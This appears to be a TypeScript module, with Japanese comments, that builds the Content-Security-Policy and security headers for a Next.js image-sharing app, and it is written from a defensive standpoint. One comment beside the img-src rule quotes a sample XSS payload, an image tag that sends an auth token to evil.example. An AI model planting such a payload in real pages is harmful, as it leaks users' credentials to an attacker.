/**
 * Content-Security-Policy の組み立て。
 *
 * next.config.ts にベタ書きしていると変更をテストで守れないため、ここに切り出している。
 * 変更したら test/lib/csp.test.ts も併せて確認すること。
 *
 * 注意: Next App Router はハイドレーション等でインラインスクリプト/スタイルを使うため
 * script/style は 'unsafe-inline' を許容している（nonce ベースの厳格化は静的プリレンダリングを
 * 全て動的化するコストがあるため見送り）。その代わり **持ち出し経路** を絞ることを重視する。
 */

/**
 * API オリジン（画像の redirect 元にもなる）。
 *
 * 独自ドメインへの移行中は**新旧の両方**を許可する。片方だけにすると、
 * 切り替えの前後どちらかで通信が CSP に弾かれる。
 * 移行が終わったら fly.dev の方を消す。
 */
const API_ORIGINS = ['https://image-palace-api.fly.dev', 'https://api.imagepalace.app']

/**
 * 画像の実体配信元。
 *
 * いまは API の `/rails/active_storage/blobs/redirect/...` が R2 の presigned URL へ 302 する。
 * CSP はリダイレクト後の URL も検査するため、**API と R2 の両方**を許可する必要がある。
 *
 * CDN（cdn.imagepalace.app）はここに**先に**入れておく。CDN_BASE_URL を設定した瞬間から
 * 画像 URL がそちらへ変わるので、許可が後回しになると画像が一斉にブロックされる。
 * 許可を広げるだけでは配信元は変わらないため、先に入れておいても副作用はない。
 */
const CDN_ORIGIN = 'https://cdn.imagepalace.app'
/**
 * Wikipedia の記事の画像。**こちらには保存せず、あちらから直に出す。**
 *
 * 保存すると、その画像の条件（作者表示など）をこちらで背負うことになる。
 * 直に出して記事へのリンクを添えれば、出どころと条件はあちらのページで辿れる。
 *
 * ここに載せるまで、画像は CSP に止められて**何も出ていなかった**（枠だけが残る）。
 */
const WIKIMEDIA_ORIGIN = 'https://upload.wikimedia.org'

const IMAGE_ORIGINS = [
  ...API_ORIGINS,
  CDN_ORIGIN,
  'https://*.r2.cloudflarestorage.com',
  WIKIMEDIA_ORIGIN,
]

/**
 * 地図の埋め込み先。**OpenStreetMap の公式の埋め込みだけ。**
 *
 * 鍵が要らず、費用もかからない（Google Maps の埋め込みも無料だが鍵が要る）。
 * ここを `https:` や `https://www.google.com` のように広く開けない——
 * iframe は持ち出しの経路になり得るので、**出す先を1つに絞る**。
 *
 * **地図は押したときにだけ出す。** カードを保存しただけで、書いた場所が
 * 外のサービスへ渡ることは無い（枠を作るのは利用者が地図を開いたとき）。
 */
const MAP_FRAME_ORIGIN = 'https://www.openstreetmap.org'

export function buildContentSecurityPolicy(): string {
  return [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' https://static.cloudflareinsights.com https://www.googletagmanager.com",
    "style-src 'self' 'unsafe-inline'",
    // 裸の https: を許可すると XSS 時に <img src="https://evil.example/?t=トークン"> で
    // 認証トークンを持ち出せてしまう。外部画像ホストは実際に使っていないため自ホストに限定する。
    `img-src 'self' data: blob: ${IMAGE_ORIGINS.join(' ')}`,
    "font-src 'self' data:",
    `connect-src 'self' ${API_ORIGINS.join(' ')} https://*.sentry.io https://cloudflareinsights.com https://*.google-analytics.com https://*.analytics.google.com`,
    // default-src 'self' へのフォールバックだと blob: の Worker が壊れるため明示する
    "worker-src 'self' blob:",
    // **既定（default-src 'self'）だと地図の枠ごと止まる。** 出す先は1つに絞る
    `frame-src 'self' ${MAP_FRAME_ORIGIN}`,
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "object-src 'none'",
  ].join('; ')
}

export const securityHeaders = [
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
]

/**
 * 本番だけで出すヘッダー。
 *
 * ## HSTS を手元で出さない理由
 *
 * 一度受け取ったブラウザは、その名前への http:// を**自分で https へ
 * 付け替える**。期限付きで、取り消しも効かない。手元の開発機や LAN の IP を
 * http で開いている人に出すと、消すまで繋がらなくなる。
 *
 * ## 値をそろえた先
 *
 * API（`api.imagepalace.app`）が既に `max-age=63072000; includeSubDomains` を
 * 返している。表側だけ短いと、短いほうに引きずられる意味が無いので合わせた。
 * `preload` は入れない——入れるとブラウザに焼き込まれ、外すのに数か月かかる。
 *
 * **これだけでは最初の1回は守れない。** 一度も開いたことのない人の
 * 最初の http:// は平文のまま届く。そこは Cloudflare の
 * 「Always Use HTTPS」で閉じる（ダッシュボード側の設定）。
 */
export const productionSecurityHeaders = [
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains' },
]
